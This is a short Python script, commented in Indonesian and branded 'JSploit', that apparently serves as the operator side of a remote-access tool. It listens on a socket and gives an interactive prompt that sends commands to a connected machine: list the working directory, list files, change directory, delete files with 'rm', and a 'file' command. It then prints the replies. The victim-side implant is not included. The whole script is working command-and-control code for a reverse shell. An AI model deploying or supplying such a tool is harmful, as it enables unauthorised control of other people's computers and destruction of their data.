import os 
import socket

sock = socket.socket()
HOST = '172.25.49.229'
PORT=8080
ENCODE = 'utf-8'
sock.bind((HOST, PORT))
print(f'Server di host {HOST} port {PORT}')
print('Menunggu Koneksi Masuk.')
sock.listen(1)
conn, addr = sock.accept()
print(f'{addr} Telah konek ke dalam server.')


while True:
  command = input('JSploit > ')
  if command == 'view_cwd':
    conn.send(command.encode(ENCODE))
    print('Command terkirim. Tunggu respon.')
    cwd = conn.recv(1024).decode(ENCODE)
    print(f'cwd > {cwd}')
  elif command == 'ls':
    conn.send(command.encode(ENCODE))
    print('Command terkirim. Tunggu Respon.')
    files = conn.recv(1024).decode(ENCODE)
    print(f'Files: \n{files}')
  elif command.startswith('cd'):
    conn.send(command.encode(ENCODE))
    status = conn.recv(1024)
    print(status.decode(ENCODE))
  elif command.startswith('rm'):
    conn.send(command.encode(ENCODE))
    status = conn.recv(1024)
    print(status.decode(ENCODE))
  elif command.startswith('file'):
    conn.send(command.encode(ENCODE))
    status = conn.recv(1024)
    print(status.decode(ENCODE))
  else:
    print('Command not found!')